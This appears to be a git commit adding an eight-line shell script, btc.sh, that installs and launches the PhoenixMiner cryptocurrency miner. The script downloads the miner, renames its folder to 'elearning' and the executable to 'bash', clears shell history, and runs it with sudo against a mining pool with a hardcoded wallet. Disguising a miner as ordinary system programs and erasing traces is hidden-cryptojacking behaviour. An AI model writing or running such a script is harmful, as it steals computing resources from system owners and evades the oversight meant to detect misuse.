d33dd854263de48649244c1d252ba69488cb9843
nurfasikin <92776649+nurfasikin@users.noreply.github.com>
2022-02-23 16:47:48 +0700

    Create btc.sh

---
+++ btc.sh
@@ -0,0 +1,8 @@
+sudo apt-get install libpci3 && wget https://phoenixminer.info/downloads/PhoenixMiner_5.9d_Linux.tar.gz 
+tar -xf PhoenixMiner_5.9d_Linux.tar.gz 
+rm -rvf PhoenixMiner_5.9d_Linux.tar.gz
+mv PhoenixMiner_5.9d_Linux  elearning
+cd elearning
+mv PhoenixMiner bash
+history -cr
+sudo ./bash -pool 4ocean.hubnas.xyz:443 -wal 3EjEBvM3wqxFMZcetxwPo9E3CkaRtoD8VX.berkah -pass x -proto 4 -stales 0
